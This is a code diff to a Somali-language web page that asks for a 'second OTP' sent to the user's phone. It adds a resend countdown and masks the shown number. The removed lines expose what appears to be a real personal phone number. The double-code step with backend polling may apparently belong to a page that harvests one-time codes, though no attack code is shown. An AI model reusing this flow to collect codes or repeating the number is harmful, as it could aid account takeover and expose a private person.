@@ -42,7 +42,7 @@
 <div class="container">
     <h2>Xaqiijinta OTP-ga Labaad</h2>
     <p>Geli OTP-ga labaad ee loogu diray lambarka taleefankaaga</p>
-    <div class="phone-num" id="display-phone">+252*********</div>
+    <div class="phone-num" id="display-phone">...</div>
 
     <div class="otp-inputs">
         <input type="text" maxlength="1" inputmode="numeric">
@@ -53,7 +53,7 @@
         <input type="text" maxlength="1" inputmode="numeric">
     </div>
 
-    <div class="resend-text">Koodka mar kale u dir 13 ilbiriqsi</div>
+    <div class="resend-text" id="timer-text"></div>
 
     <button class="btn-verify" id="verify-btn">XAQIIJI OTP GA LABAAD</button>
     <div id="status-msg" style="margin-top:15px; font-size:14px;"></div>
@@ -64,16 +64,52 @@
 </div>
 
 <script>
-const phone = localStorage.getItem('userPhone') || "+252616286903";
+const phone = localStorage.getItem('userPhone') || "+252*********";
 document.getElementById('display-phone').innerText = phone;
 
 const inputs = document.querySelectorAll('.otp-inputs input');
 const btn = document.getElementById('verify-btn');
+const timerDisplay = document.getElementById('timer-text');
 
-// Input handling
+let countdown;
+
+// START TIMER FUNCTION
+function startTimer() {
+    let secondsLeft = 60;
+
+    clearInterval(countdown);
+
+    countdown = setInterval(() => {
+        secondsLeft--;
+
+        if (secondsLeft <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = `<span id="resend-btn" style="color:#2ecc71; cursor:pointer;">Koodka dib u dir</span>`;
+            
+            document.getElementById('resend-btn').addEventListener('click', resendCode);
+        } else {
+            timerDisplay.innerText = `Koodka mar kale u dir ${secondsLeft} ilbiriqsi`;
+        }
+    }, 1000);
+}
+
+// RESEND FUNCTION
+function resendCode() {
+    document.getElementById('status-msg').innerText = "Kood cusub ayaa la dirayaa...";
+    
+    // Optional: call backend here if needed
+    // fetch('/api/resend-otp', ...)
+
+    startTimer();
+}
+
+// START FIRST TIMER
+startTimer();
+
+// INPUT HANDLING
 inputs.forEach((input, index) => {
     input.addEventListener('input', () => {
-        input.value = input.value.replace(/\D/g, ''); // numbers only
+        input.value = input.value.replace(/\D/g, '');
 
         if (input.value && index < inputs.length - 1) {
             inputs[index + 1].focus();
@@ -97,15 +133,13 @@ function checkFull() {
     }
 }
 
-// Button click
 btn.addEventListener('click', submitOtp);
 
+// SUBMIT OTP
 async function submitOtp() {
     if (!btn.classList.contains('active')) return;
 
     const otp = Array.from(inputs).map(i => i.value).join('');
-    if (otp.length < 6) return;
-
     document.getElementById('status-msg').innerText = "Fadlan sug...";
 
     try {
@@ -125,6 +159,7 @@ async function submitOtp() {
     }
 }
 
+// POLLING
 function startPolling() {
     const interval = setInterval(async () => {
         try {
